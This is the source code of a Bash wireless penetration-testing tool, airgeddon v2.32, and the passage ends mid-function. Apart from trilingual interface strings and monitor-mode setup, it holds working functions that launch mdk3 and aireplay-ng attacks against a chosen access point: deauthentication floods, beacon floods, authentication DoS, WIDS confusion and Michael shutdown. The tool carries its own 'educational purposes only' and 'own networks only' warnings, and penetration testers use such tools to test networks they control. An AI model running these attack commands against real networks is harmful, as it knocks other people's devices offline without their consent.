#!/bin/bash

version="2.32"

#Change these lines to select another default language
language="english"
#language="spanish"
#language="french"

#General vars
urlgithub="https://github.com/v1s1t0r1sh3r3/airgeddon"
mail="v1s1t0r.1sh3r3@gmail.com"
essential_tools=(iwconfig awk airmon-ng airodump-ng aireplay-ng mdk3)
declare -A lang_association=(["en"]="english" ["es"]="spanish" ["fr"]="french")

#Distro vars
known_compatible_distros=(wifislax kali parrot backbox blackarch)
known_nondirectly_compatible_distros=(ubuntu debian)

#Colors
green_color="\033[1;32m"
red_color="\033[1;31m"
blue_color="\033[1;34m"
yellow_color="\033[1;33m"
pink_color="\033[1;35m"
normal_color="\e[1;0m"

function language_strings() {

	declare -A arr
	arr["english",0]="This interface $interface is already in managed mode"
	arr["spanish",0]="Este interfaz $interface ya está en modo managed"
	arr["french",0]="L'interface $interface est déjà en mode managed"

	arr["english",1]="This interface $interface is not a wifi card. It doesn't support managed mode"
	arr["spanish",1]="Este interfaz $interface no es una tarjeta wifi. No soporta modo managed"
	arr["french",1]="L'interface $interface n'est pas une carte wifi. Elle n'est donc pas compatible mode managed"

	arr["english",2]="English O.S. language detected. Supported by script. Automatically changed"
	arr["spanish",2]="Idioma Español del S.O. detectado. Soportado por el script. Se cambió automaticamente"
	arr["french",2]="Langue Française de O.S. détectée. Pris en charge par le script. Changé automatiquement"

	arr["english",3]="Select target network :"
	arr["spanish",3]="Selecciona la red objetivo :"
	arr["french",3]="Sélectionnez le réseau cible :"

	arr["english",4]="Press [Enter] key to start attack..."
	arr["spanish",4]="Pulse la tecla [Enter] para comenzar el ataque..."
	arr["french",4]="Pressez [Enter] pour commencer l'attaque..."

	arr["english",5]="No compatible distro detected"
	arr["spanish",5]="No se ha detectado una distro compatible"
	arr["french",5]="La distro détectée n'est pas compatible"

	arr["english",6]="Welcome to airgeddon script v$version"
	arr["spanish",6]="Bienvenid@ al airgeddon script v$version"
	arr["french",6]="Bienvenue au script airgeddon v$version"

	arr["english",7]="This script is only for educational purposes. Be good boyz&girlz"
	arr["spanish",7]="Este script se ha hecho sólo con fines educativos. Sed buen@s chic@s"
	arr["french",7]="Ce script a été fait à des fins purement éducatives. Portez-vous biens!"

	arr["english",8]="Known 100% compatible distros with this script :"
	arr["spanish",8]="Distros conocidas 100% compatibles con este script :"
	arr["french",8]="Distros connus 100% compatibles avec ce script :"

	arr["english",9]="Detecting distro..."
	arr["spanish",9]="Detectando distro..."
	arr["french",9]="Détection de la distro..."

	arr["english",10]="This interface $interface is already in monitor mode"
	arr["spanish",10]="Este interfaz $interface ya está en modo monitor"
	arr["french",10]="L'interface $interface est déjà en mode moniteur"

	arr["english",11]="Exiting airgeddon script - 2016 - See you soon! :)"
	arr["spanish",11]="Saliendo de airgeddon script - 2016 - Nos vemos pronto! :)"
	arr["french",11]="Fermeture du script airgeddon - 2016 - A bientôt! :)"

	arr["english",12]="Please, exit properly using menu option"
	arr["spanish",12]="Por favor, sal del script correctamente utilizando la opción del menú"
	arr["french",12]="S'il vous plaît, veuillez utiliser l'option du menue pour arrêter corectement le script"

	arr["english",13]="This interface $interface is not a wifi card. It doesn't support monitor mode"
	arr["spanish",13]="Este interfaz $interface no es una tarjeta wifi. No soporta modo monitor"
	arr["french",13]="L'interface $interface n'est pas une carte wifi. Elle n'est donc pas compatible mode moniteur"

	arr["english",14]="This interface $interface is not in monitor mode"
	arr["spanish",14]="Este interfaz $interface no está en modo monitor"
	arr["french",14]="L'interface $interface n'est pas en mode moniteur"

	arr["english",15]="The interface changed its name while putting in managed mode. Autoselected"
	arr["spanish",15]="Este interfaz ha cambiado su nombre al ponerlo en modo managed. Se ha seleccionado automáticamente"
	arr["french",15]="Le nom de l'interface a changé lors du passage en mode managed. Elle a été sélectionnée automatiquement"

	arr["english",16]="Managed mode now is set on $interface"
	arr["spanish",16]="Se ha puesto el modo managed en $interface"
	arr["french",16]="$interface est maintenant en mode manged"

	arr["english",17]="Putting your interface in managed mode..."
	arr["spanish",17]="Poniendo el interfaz en modo managed..."
	arr["french",17]="L'interface est en train de passer en mode managed"

	arr["english",18]="Putting your interface in monitor mode..."
	arr["spanish",18]="Poniendo el interfaz en modo monitor..."
	arr["french",18]="L'interface est en train de passer en mode moniteur..."

	arr["english",19]="Please be patient. Maybe killing some conflicting processes..."
	arr["spanish",19]="Por favor ten paciencia. Puede que esté matando algunos procesos que podrían causar conflicto..."
	arr["french",19]="Soyez patients s'il vous plaît. Il se peut qu'il faile tuer des processus conflictuels.."

	arr["english",20]="This interface $interface doesn't support monitor mode"
	arr["spanish",20]="Este interfaz $interface no soporta modo monitor"
	arr["french",20]="L'interface $interface n'est pas compatible mode moniteur"

	arr["english",21]="The interface changed its name while putting in monitor mode. Autoselected"
	arr["spanish",21]="Este interfaz ha cambiado su nombre al ponerlo en modo monitor. Se ha seleccionado automáticamente"
	arr["french",21]="Le nom de l'interface à changé lors de l'activation du mode moniteur. Elle a été automatiquement sélectionnée"

	arr["english",22]="Monitor mode now is set on $interface"
	arr["spanish",22]="Se ha puesto el modo monitor en $interface"
	arr["french",22]="Mode moniteur activé sur l'interface $interface"

	arr["english",23]="There is a problem with the interface selected. Redirecting you to script exit"
	arr["spanish",23]="Hay un problema con el interfaz seleccionado. Redirigiendo a la salida del script"
	arr["french",23]="Il y a un problème avec l'interface choisie. Vous allez être dirigés vers la sortie du script"

	arr["english",24]="Select an interface to work with :"
	arr["spanish",24]="Selecciona un interfaz para trabajar con él :"
	arr["french",24]="Sélectionnez l'interface pour travailler :"

	arr["english",25]="Set channel (1-14) :"
	arr["spanish",25]="Selecciona un canal (1-14) :"
	arr["french",25]="Sélectionnez un canal (1-14) :"

	arr["english",26]="Channel set to ${channel}"
	arr["spanish",26]="Canal elegido ${channel}"
	arr["french",26]="Le canal ${channel} a été choisi"

	arr["english",27]="Type target BSSID (example: 00:11:22:33:44:55) :"
	arr["spanish",27]="Escribe el BSSID objetivo (ejemplo: 00:11:22:33:44:55) :"
	arr["french",27]="Veuillez entrer le BSSID de l'objectif (exemple: 00:11:22:33:44:55) :"

	arr["english",28]="BSSID set to ${bssid}"
	arr["spanish",28]="BSSID elegido ${bssid}"
	arr["french",28]="Le BSSID choisi est ${bssid}"

	arr["english",29]="Type target ESSID :"
	arr["spanish",29]="Escribe el ESSID objetivo :"
	arr["french",29]="Écrivez l'ESSID du réseau cible :"

	arr["english",30]="You have selected a hidden network ESSID. Can't be used. Select another one or perform a BSSID based attack instead of this"
	arr["spanish",30]="Has seleccionado un ESSID de red oculta. No se puede usar. Selecciona otro o ejecuta un ataque basado en BSSID en lugar de este"
	arr["french",30]="Vous avez choisi un réseau dont l'ESSID est caché et ce n'est pas possible. Veuillez sélectionner une autre cible ou bien effectuer une attaque qui se fonde sur le BSSID au lieu de celle-ci."

	arr["english",31]="ESSID set to ${essid}"
	arr["spanish",31]="ESSID elegido ${essid}"
	arr["french",31]="l'ESSID sélectionné est ${essid}"

	arr["english",32]="All parameters set"
	arr["spanish",32]="Todos los parámetros están listos"
	arr["french",32]="Tous les paramètres sont correctement établis"

	arr["english",33]="Starting attack. When started, press Ctrl+C to stop..."
	arr["spanish",33]="Comenzando ataque. Una vez empezado, pulse Ctrl+C para pararlo..."
	arr["french",33]="L'attaque est lancé. Pressez Ctrl+C pour l'arrêter..."

	arr["english",34]="Selected interface $interface is in monitor mode. Attack can be performed"
	arr["spanish",34]="El interfaz seleccionado $interface está en modo monitor. El ataque se puede realizar"
	arr["french",34]="L'interface $interface qui a été sélectionnée est bien en mode moniteur. L'attaque peut être lancée"

	arr["english",35]="Deauthentication / Dissasociation mdk3 attack chosen (monitor mode needed)"
	arr["spanish",35]="Elegido ataque de Desautenticación / Desasociación mdk3 (modo monitor requerido)"
	arr["french",35]="L'attaque de Dés-authentification / Dissociation mdk3 a été choisie (mode moniteur nécessaire)"

	arr["english",36]="Deauthentication aireplay attack chosen (monitor mode needed)"
	arr["spanish",36]="Elegido ataque de Desautenticación aireplay (modo monitor requerido)"
	arr["french",36]="L'attaque de Dés-authentification aireplay a été choisie (mode moniteur nécessaire)"

	arr["english",37]="WIDS / WIPS / WDS Confusion attack chosen (monitor mode needed)"
	arr["spanish",37]="Elegido ataque Confusion WIDS / WIPS / WDS (modo monitor requerido)"
	arr["french",37]="L'attaque Confusion WIDS / WIPS / WDS a été choisie (mode moniteur nécessaire)"

	arr["english",38]="Beacon flood attack chosen (monitor mode needed)"
	arr["spanish",38]="Elegido ataque Beacon flood (modo monitor requerido)"
	arr["french",38]="L'attaque Beacon flood a été choisie (mode moniteur nécessaire)"

	arr["english",39]="Auth DoS attack chosen (monitor mode needed)"
	arr["spanish",39]="Elegido ataque Auth DoS (modo monitor requerido)"
	arr["french",39]="L'attaque Auth DoS a été choisie (modo moniteur nécessaire)"

	arr["english",40]="Michael Shutdown (TKIP) attack chosen (monitor mode needed)"
	arr["spanish",40]="Elegido ataque Michael Shutdown (TKIP) (modo monitor requerido)"
	arr["french",40]="L'attaque Michael Shutdown (TKIP) a été choisie (mode moniteur nécessaire)"

	arr["english",41]="No interface selected. You'll be redirected to select one"
	arr["spanish",41]="No hay interfaz seleccionado. Serás redirigido para seleccionar uno"
	arr["french",41]="Aucune interface sélectionnée. Vous allez retourner au menu de sélection pour en choisir une"

	arr["english",42]="Interface $interface selected. Mode: $ifacemode"
	arr["spanish",42]="Interfaz $interface seleccionado. Modo: $ifacemode"
	arr["french",42]="Interface $interface sélectionnée. Mode: $ifacemode"

	arr["english",43]="Selected BSSID: $bssid"
	arr["spanish",43]="BSSID seleccionado: $bssid"
	arr["french",43]="BSSID sélectionné: $bssid"

	arr["english",44]="Selected channel: $channel"
	arr["spanish",44]="Canal seleccionado: $channel"
	arr["french",44]="Canal sélectionné: $channel"

	arr["english",45]="Selected ESSID: $essid <- can't be used"
	arr["spanish",45]="ESSID seleccionado: $essid <- no se puede usar"
	arr["french",45]="ESSID sélectionné: $essid <- ne peut pas être utilisé"

	arr["english",46]="Selected ESSID: $essid"
	arr["spanish",46]="ESSID seleccionado: $essid"
	arr["french",46]="ESSID sélectionné: $essid"

	arr["english",47]="Select an option from menu :"
	arr["spanish",47]="Selecciona una opción del menú :"
	arr["french",47]="Choisissez une des options du menu :"

	arr["english",48]="1.  Select another network interface"
	arr["spanish",48]="1.  Selecciona otro interfaz de red"
	arr["french",48]="1.  Sélectionnez une autre interface réseaux"

	arr["english",49]="2.  Explore neighbourhood for targets (monitor mode needed)"
	arr["spanish",49]="2.  Explorar el vecindario para buscar objetivos (modo monitor requerido)"
	arr["french",49]="2.  Détection des réseaux pour choisir une cible (modo moniteur obligatoire)"

	arr["english",50]="---------(monitor mode needed for attacks)---------"
	arr["spanish",50]="--------(modo monitor requerido en ataques)--------"
	arr["french",50]="---(modo moniteur obligatoire pour ces attaques)---"

	arr["english",51]="3.  Deauth / disassoc amok mdk3 attack"
	arr["spanish",51]="3.  Ataque Deauth / Disassoc amok mdk3"
	arr["french",51]="3.  Attaque Deauth / Disassoc amok mdk3"

	arr["english",52]="4.  Deauth aireplay attack"
	arr["spanish",52]="4.  Ataque Deauth aireplay"
	arr["french",52]="4.  Attaque Deauth aireplay"

	arr["english",53]="5.  WIDS / WIPS / WDS Confusion attack"
	arr["spanish",53]="5.  Ataque WIDS / WIPS / WDS Confusion"
	arr["french",53]="5.  Attaque WIDS / WIPS / WDS Confusion"

	arr["english",54]="6.  Old \"obsolete/non very effective\" attacks menu"
	arr["spanish",54]="6.  Menú de antiguos ataques \"obsoletos/no muy efectivos\""
	arr["french",54]="6.  Menu des anciennes attaques \"obsolètes/peu efficaces\""

	arr["english",55]="7.  Put interface in monitor mode"
	arr["spanish",55]="7.  Poner el interfaz en modo monitor"
	arr["french",55]="7.  Passer l'interface en mode moniteur"

	arr["english",56]="8.  Put interface in managed mode"
	arr["spanish",56]="8.  Poner el interfaz en modo managed"
	arr["french",56]="8.  Passer l'interface en mode managed"

	arr["english",57]="6.  Put interface in monitor mode"
	arr["spanish",57]="6.  Poner el interfaz en modo monitor"
	arr["french",57]="6.  Passer l'interface en mode moniteur"

	arr["english",58]="7.  Put interface in managed mode"
	arr["spanish",58]="7.  Poner el interfaz en modo managed"
	arr["french",58]="7.  Passer l'interface en mode managed"

	arr["english",59]="8.  Return to main menu"
	arr["spanish",59]="8.  Volver al menú principal"
	arr["french",59]="8.  Retourner au menu principal"

	arr["english",60]="9.  About & Credits"
	arr["spanish",60]="9.  Acerca de & Créditos"
	arr["french",60]="9.  A propos de & Crédits"

	arr["english",61]="11. Exit script"
	arr["spanish",61]="11. Salir del script"
	arr["french",61]="11. Sortir du script"

	arr["english",62]="3.  Beacon flood attack"
	arr["spanish",62]="3.  Ataque Beacon flood"
	arr["french",62]="3.  Attaque Beacon flood"

	arr["english",63]="4.  Auth DoS attack"
	arr["spanish",63]="4.  Ataque Auth DoS"
	arr["french",63]="4.  Attaque Auth DoS"

	arr["english",64]="5.  Michael shutdown exploitation (TKIP) attack"
	arr["spanish",64]="5.  Ataque Michael shutdown exploitation (TKIP)"
	arr["french",64]="5.  Attaque Michael shutdown exploitation (TKIP)"

	arr["english",65]="Exploring neighbourhood option chosen (monitor mode needed)"
	arr["spanish",65]="Elegida opción de exploración del vecindario (modo monitor requerido)"
	arr["french",65]="L'option découverte des réseaux avoisinants a été choisie (modo moniteur nécessaire)"

	arr["english",66]="Selected interface $interface is in monitor mode. Exploration can be performed"
	arr["spanish",66]="El interfaz seleccionado $interface está en modo monitor. La exploración se puede realizar"
	arr["french",66]="L'interface choisie $interface est en mode moniteur. L'exploration des réseaux environnants peut s'effectuer"

	arr["english",67]="When started, press Ctrl+C to stop..."
	arr["spanish",67]="Una vez empezado, pulse Ctrl+C para pararlo..."
	arr["french",67]="Une foi l'opération lancée, veuillez presser Ctrl+C pour l'arrêter..."

	arr["english",68]="No networks found"
	arr["spanish",68]="No se encontraron redes"
	arr["french",68]="Aucun réseau détecté"

	arr["english",69]="  N.         BSSID      CHANNEL  PWR       ESSID"
	arr["spanish",69]="  N.         BSSID        CANAL  PWR       ESSID"
	arr["french",69]="  N.         BSSID        CANAL  PWR       ESSID"

	arr["english",70]="Only one target detected. Autoselected"
	arr["spanish",70]="Sólo un objetivo detectado. Se ha seleccionado automáticamente"
	arr["french",70]="Un seul réseau a été détecté. Il a été automatiquement sélectionné"

	arr["english",71]="(*) Network with clients"
	arr["spanish",71]="(*) Red con clientes"
	arr["french",71]="(*) Réseau avec clients"

	arr["english",72]="Invalid target network was chosen"
	arr["spanish",72]="Red objetivo elegida no válida"
	arr["french",72]="Le choix du réseau cible est invalide"

	arr["english",73]="airgeddon script v$version developed by :"
	arr["spanish",73]="airgeddon script v$version programado por :"
	arr["french",73]="Le script airgeddon v$version a été programmé par :"

	arr["english",74]="This script is under GPLv2 (or later) License"
	arr["spanish",74]="Este script está bajo Licencia GPLv2 (o posterior)"
	arr["french",74]="Script publié sous Licence GPLv2 (ou version supèrieure)"

	arr["english",75]="Thanks to the \"Spanish pen testing crew\" and \"Wifislax Staff\" for beta testing and support received"
	arr["spanish",75]="Gracias al \"Spanish pen testing crew\" y al \"Wifislax Staff\" por el beta testing y el apoyo recibido"
	arr["french",75]="Merci au \"Spanish pen testing crew\" et au \"Wifislax Staff\" pour les tests en phase bêta et leur soutien"

	arr["english",76]="Invalid menu option was chosen"
	arr["spanish",76]="Opción del menú no válida"
	arr["french",76]="Option erronée"

	arr["english",77]="Invalid interface was chosen"
	arr["spanish",77]="Interfaz no válida"
	arr["french",77]="L'interface choisie n'existe pas"

	arr["english",78]="10. Change language"
	arr["spanish",78]="10. Cambiar idioma"
	arr["french",78]="10. Changer de langue"

	arr["english",79]="1.  English"
	arr["spanish",79]="1.  Inglés"
	arr["french",79]="1.  Anglais"

	arr["english",80]="2.  Spanish"
	arr["spanish",80]="2.  Español"
	arr["french",80]="2.  Espagnol"

	arr["english",81]="Select a language :"
	arr["spanish",81]="Selecciona un idioma :"
	arr["french",81]="Choisissez une langue :"

	arr["english",82]="Invalid language was chosen"
	arr["spanish",82]="Idioma no válido"
	arr["french",82]="Langue non valide"

	arr["english",83]="Language changed to English"
	arr["spanish",83]="Idioma cambiado a Inglés"
	arr["french",83]="Le script sera maintenant en Anglais"

	arr["english",84]="Language changed to Spanish"
	arr["spanish",84]="Idioma cambiado a Español"
	arr["french",84]="Le script sera maintenant en Espagnol"

	arr["english",85]="Send me bugs or suggestions to $mail"
	arr["spanish",85]="Enviadme errores o sugerencias a $mail"
	arr["french",85]="Envoyer des erreurs ou des suggestions à $mail"

	arr["english",86]="Welcome"
	arr["spanish",86]="Bienvenid@"
	arr["french",86]="Bienvenue"

	arr["english",87]="Change language"
	arr["spanish",87]="Cambiar idioma"
	arr["french",87]="Changer de langue"

	arr["english",88]="Interface selection"
	arr["spanish",88]="Selección de interfaz"
	arr["french",88]="Sélection de l'interface"

	arr["english",89]="Mdk3 amok action"
	arr["spanish",89]="Acción mdk3 amok"
	arr["french",89]="Action mdk3 amok"

	arr["english",90]="Aireplay deauth action"
	arr["spanish",90]="Acción aireplay deauth"
	arr["french",90]="Action aireplay deauth"

	arr["english",91]="WIDS / WIPS / WDS confusion action"
	arr["spanish",91]="Acción WIDS / WIPS / WDS confusion"
	arr["french",91]="Action WIDS / WIPS / WDS confusion"

	arr["english",92]="Beacon flood action"
	arr["spanish",92]="Acción Beacon flood"
	arr["french",92]="Action Beacon flood"

	arr["english",93]="Auth DoS action"
	arr["spanish",93]="Acción Auth DoS"
	arr["french",93]="Action Auth DoS"

	arr["english",94]="Michael Shutdown action"
	arr["spanish",94]="Acción Michael Shutdown"
	arr["french",94]="Action Michael Shutdown"

	arr["english",95]="Mdk3 amok parameters"
	arr["spanish",95]="Parámetros Mdk3 amok"
	arr["french",95]="Paramètres Mdk3 amok"

	arr["english",96]="Aireplay deauth parameters"
	arr["spanish",96]="Parámetros Aireplay deauth"
	arr["french",96]="Paramètres Aireplay deauth"

	arr["english",97]="WIDS / WIPS / WDS parameters"
	arr["spanish",97]="Parámetros WIDS / WIPS / WDS"
	arr["french",97]="Paramètres WIDS / WIPS / WDS"

	arr["english",98]="Beacon flood parameters"
	arr["spanish",98]="Parámetros Beacon flood"
	arr["french",98]="Paramètres Beacon flood"

	arr["english",99]="Auth DoS parameters"
	arr["spanish",99]="Parámetros Auth DoS"
	arr["french",99]="Paramètres Auth DoS"

	arr["english",100]="Michael Shutdown parameters"
	arr["spanish",100]="Parámetros Michael Shutdown"
	arr["french",100]="Paramètres Michael Shutdown"

	arr["english",101]="Airgeddon script menu"
	arr["spanish",101]="Menú airgeddon script"
	arr["french",101]="Menu airgeddon script"

	arr["english",102]="Old attacks menu"
	arr["spanish",102]="Menú ataques antiguos"
	arr["french",102]="Menu des vieilles attaques"

	arr["english",103]="Exploring Neighbourhood"
	arr["spanish",103]="Explorar vecindario"
	arr["french",103]="Détection des réseaux avoisinants"

	arr["english",104]="Select target"
	arr["spanish",104]="Seleccionar objetivo"
	arr["french",104]="Selection de l'objectif"

	arr["english",105]="About & Credits"
	arr["spanish",105]="Acerca de & Créditos"
	arr["french",105]="A propos de & Crédits"

	arr["english",106]="Exiting"
	arr["spanish",106]="Saliendo"
	arr["french",106]="Sortie du script"

	arr["english",107]="Join the project at $urlgithub"
	arr["spanish",107]="Únete al proyecto en $urlgithub"
	arr["french",107]="Rejoignez le projet : $urlgithub"

	arr["english",108]="Let's check if you have installed what script needs"
	arr["spanish",108]="Vamos a chequear si tienes instalado lo que el script usa"
	arr["french",108]="Nous allons vérifier si les dépendances sont bien installées"

	arr["english",109]="Checking..."
	arr["spanish",109]="Comprobando..."
	arr["french",109]="Vérification..."

	arr["english",110]="Your distro is compatible. Script can continue..."
	arr["spanish",110]="Tu distro es compatible. El script puede continuar..."
	arr["french",110]="Votre distribution est compatible. Le script peut continuer..."

	arr["english",111]="You need to install some tools before running this script"
	arr["spanish",111]="Necesitas instalar algunas herramientas antes de lanzar este script"
	arr["french",111]="Vous devez installer quelques programmes avant de pouvoir lancer ce script"

	arr["english",112]="Language changed to French"
	arr["spanish",112]="Idioma cambiado a Francés"
	arr["french",112]="Le script sera maintenant en Français"

	arr["english",113]="3.  French"
	arr["spanish",113]="3.  Francés"
	arr["french",113]="3.  Français"

	arr["english",114]="Use it only on your own networks!!"
	arr["spanish",114]="Utilízalo solo en tus propias redes!!"
	arr["french",114]="Utilisez-le seulement dans vos propres réseaux!!"

	arr["english",115]="Press [Enter] key to continue..."
	arr["spanish",115]="Pulse la tecla [Enter] para continuar..."
	arr["french",115]="Pressez [Enter] pour continuer..."

	case "$3" in
		"yellow")
			echo_yellow "${arr[$1,$2]}"
		;;
		"blue")
			echo_blue "${arr[$1,$2]}"
		;;
		"red")
			echo_red "${arr[$1,$2]}"
		;;
		"green")
			echo_green "${arr[$1,$2]}"
		;;
		"pink")
			echo_pink "${arr[$1,$2]}"
		;;
		"titlered")
			generate_title "${arr[$1,$2]}" "red"
		;;
		"read")
			read -p "${arr[$1,$2]}"
		;;
		*)
			echo "${arr[$1,$2]}"
		;;
	esac
}

function generate_title() {

	ncharstitle=78
	titlechar="*"
	titletext=$1
	titlelength=${#titletext}
	finaltitle=""

	for ((i=0; i < ($ncharstitle/2 - $titlelength+($titlelength/2)); i++)); do
		finaltitle="$finaltitle$titlechar"
	done

	finaltitle="$finaltitle $titletext "

	for ((i=0; i < ($ncharstitle/2 - $titlelength+($titlelength/2)); i++)); do
		finaltitle="$finaltitle$titlechar"
	done

	if [ $(($titlelength % 2)) -gt 0 ]; then
		finaltitle+="$titlechar"
	fi

	case "$2" in
		"yellow")
			echo_yellow "$finaltitle"
		;;
		"red")
			echo_red "$finaltitle"
		;;
		"blue")
			echo_blue "$finaltitle"
		;;
		"green")
			echo_green "$finaltitle"
		;;
		*)
			echo -e "$finaltitle"
		;;
	esac
}

function check_to_set_managed() {

	check_interface_mode
	case "$ifacemode" in
		"Managed")
			echo
			language_strings $language 0 "yellow"
			language_strings $language 115 "read"
			return 1
		;;
		"(Non wifi card)")
			echo
			language_strings $language 1 "yellow"
			language_strings $language 115 "read"
			return 1
		;;
	esac
	return 0
}

function check_to_set_monitor() {

	check_interface_mode
	case "$ifacemode" in
		"Monitor")
			echo
			language_strings $language 10 "yellow"
			language_strings $language 115 "read"
			return 1
		;;
		"(Non wifi card)")
			echo
			language_strings $language 13 "yellow"
			language_strings $language 115 "read"
			return 1
		;;
	esac
	return 0
}

function check_monitor_enabled() {

	mode=`iwconfig $interface 2> /dev/null | grep Mode: | awk '{print $4}' | cut -d ':' -f 2`

	if [[ $mode != "Monitor" ]]; then
		echo
		language_strings $language 14 "yellow"
		language_strings $language 115 "read"
		return 1
	fi
	return 0
}

function disable_rfkill() {

	if hash rfkill 2> /dev/null; then
		rfkill unblock 0
		for i in {0..5}; do
			rfkill unblock $i > /dev/null
		done
	fi
}

function managed_option() {

	check_to_set_managed

	if [ "$?" != "0" ]; then
		return
	fi

	disable_rfkill

	language_strings $language 17 "blue"
	ifconfig $interface up

	new_interface=$($airmon stop $interface | grep station | cut -d ']' -f 2)
	new_interface=${new_interface:: -1}

	if [ "$interface" != "$new_interface" ]; then
		echo
		language_strings $language 15 "yellow"
		interface=$new_interface
	fi

	echo
	language_strings $language 16 "yellow"
	language_strings $language 115 "read"
}

function monitor_option() {

	check_to_set_monitor

	if [ "$?" != "0" ]; then
		return
	fi

	disable_rfkill

	language_strings $language 18 "blue"
	language_strings $language 19 "blue"
	ifconfig $interface up
	iwconfig $interface rate 1M > /dev/null 2>&1

	if [ "$?" != "0" ]; then
		echo
		language_strings $language 20 "yellow"
		language_strings $language 115 "read"
		return
	fi

	$airmon check kill > /dev/null 2>&1

	new_interface=$($airmon start $interface | grep monitor | cut -d ']' -f 3)

	new_interface=${new_interface:: -1}

	if [ "$interface" != "$new_interface" ]; then
		echo
		language_strings $language 21 "yellow"
		interface=$new_interface
	fi

	echo
	language_strings $language 22 "yellow"
	language_strings $language 115 "read"
}

function check_interface_mode() {

	iwconfig_fix
	iwcmd="iwconfig $interface $iwcmdfix > /dev/null 2> /dev/null"
	eval $iwcmd
	if [[ "$?" != "0" ]]; then
		ifacemode="(Non wifi card)"
		return 0
	fi

	modemanaged=`iwconfig $interface 2> /dev/null | grep Mode: | cut -d ':' -f 2 | cut -d ' ' -f 1`

	if [[ $modemanaged = "Managed" ]]; then
		ifacemode="Managed"
		return 0
	fi

	modemonitor=`iwconfig $interface 2> /dev/null | grep Mode: | awk '{print $4}' | cut -d ':' -f 2`

	if [[ $modemonitor = "Monitor" ]]; then
		ifacemode="Monitor"
		return 0
	fi

	language_strings $language 23 "yellow"
	language_strings $language 115 "read"
	exit_script_option
}

function language_option() {

	clear
	language_strings $language 87 "titlered"
	language_strings $language 81 "green"
	echo
	language_strings $language 79
	language_strings $language 80
	language_strings $language 113

	read language_selected
	case $language_selected in
		1)
			language="english"
			language_strings $language 83 "yellow"
			language_strings $language 115 "read"
		;;
		2)
			language="spanish"
			language_strings $language 84 "yellow"
			language_strings $language 115 "read"
		;;
		3)
			language="french"
			language_strings $language 112 "yellow"
			language_strings $language 115 "read"
		;;
		*)
			invalid_language_selected
		;;
	esac
}

function select_interface() {

	clear
	language_strings $language 88 "titlered"
	language_strings $language 24 "green"
	echo
	ifaces=`ip link|egrep "^[0-9]+"|cut -d ':' -f 2|awk {'print $1'}|grep lo -v`
	option_counter=0
	for item in $ifaces; do
		option_counter=$[option_counter + 1]
		echo "$option_counter. $item"
	done
	read iface
	if [ -z $iface ]; then
		invalid_iface_selected
		else if [[ $iface < 1 ]] || [[ $iface > $option_counter ]]; then
			invalid_iface_selected
		else
			option_counter2=0
			for item2 in $ifaces; do
				option_counter2=$[option_counter2 + 1]
				if [[ "$iface" = "$option_counter2" ]]; then
					interface=$item2
					break;
				fi
			done
		fi
	fi
}

function read_channel() {

	echo
	language_strings $language 25 "green"
	read channel
}

function ask_channel() {

	while [[ ! ${channel} =~ ^([1-9]|1[0-4])$ ]]; do
		read_channel
	done
	echo
	language_strings $language 26 "yellow"
}

function read_bssid() {

	echo
	language_strings $language 27 "green"
	read bssid
}

function ask_bssid() {

	while [[ ! ${bssid} =~ ^([a-fA-F0-9]{2}:){5}[a-zA-Z0-9]{2}$ ]]; do
		read_bssid
	done
	echo
	language_strings $language 28 "yellow"
}

function read_essid() {

	echo
	language_strings $language 29 "green"
	read essid
}

function ask_essid() {

	if [ -z "$essid" ]; then
		read_essid
		else if [ "$essid" = "(Hidden Network)" ]; then
			echo
			language_strings $language 30 "yellow"
			read_essid
		fi
	fi

	echo
	language_strings $language 31 "yellow"
}

function exec_mdk3deauth() {

	echo
	language_strings $language 89 "titlered"
	language_strings $language 32 "green"

	rm -rf /tmp/bl.txt > /dev/null 2>&1
	echo $bssid > /tmp/bl.txt

	echo
	language_strings $language 33 "blue"
	language_strings $language 4 "read"
	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "mdk3 amok attack" -e mdk3 $interface d -b /tmp/bl.txt -c $channel
}

function exec_aireplaydeauth() {

	echo
	language_strings $language 90 "titlered"
	language_strings $language 32 "green"

	$airmon start $interface $channel > /dev/null 2>&1

	echo
	language_strings $language 33 "blue"
	language_strings $language 4 "read"
	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a $bssid --ignore-negative-one $interface
}

function exec_wdsconfusion() {

	echo
	language_strings $language 91 "titlered"
	language_strings $language 32 "green"

	echo
	language_strings $language 33 "blue"
	language_strings $language 4 "read"
	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "wids / wips / wds confusion attack" -e mdk3 $interface w -e $essid -c $channel
}

function exec_beaconflood() {

	echo
	language_strings $language 92 "titlered"
	language_strings $language 32 "green"

	echo
	language_strings $language 33 "blue"
	language_strings $language 4 "read"
	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "beacon flood attack" -e mdk3 $interface b -n $essid -c $channel -s 1000 -h
}

function exec_authdos() {

	echo
	language_strings $language 93 "titlered"
	language_strings $language 32 "green"

	echo
	language_strings $language 33 "blue"
	language_strings $language 4 "read"
	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "auth dos attack" -e mdk3 $interface a -a $bssid -m -s 1024
}

function exec_michaelshutdown() {

	echo
	language_strings $language 94 "titlered"
	language_strings $language 32 "green"

	echo
	language_strings $language 33 "blue"
	language_strings $language 4 "read"
	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "michael shutdown attack" -e mdk3 $interface m -t $bssid -w 1 -n 1024 -s 1024
}

function mdk3_deauth_option() {

	echo
	language_strings $language 95 "titlered"
	language_strings $language 35 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings $language 34 "yellow"

	ask_bssid
	ask_channel
	exec_mdk3deauth
}

function aireplay_deauth_option() {

	echo
	language_strings $language 96 "titlered"
	language_strings $language 36 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings $language 34 "yellow"

	ask_bssid
	ask_channel
	exec_aireplaydeauth
}

function wds_confusion_option() {

	echo
	language_strings $language 97 "titlered"
	language_strings $language 37 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings $language 34 "yellow"

	ask_essid
	ask_channel
	exec_wdsconfusion
}

function beacon_flood_option() {

	echo
	language_strings $language 98 "titlered"
	language_strings $language 38 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings $language 34 "yellow"

	ask_essid
	ask_channel
	exec_beaconflood
}

function auth_dos_option() {

	echo
	language_strings $language 99 "titlered"
	language_strings $language 39 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
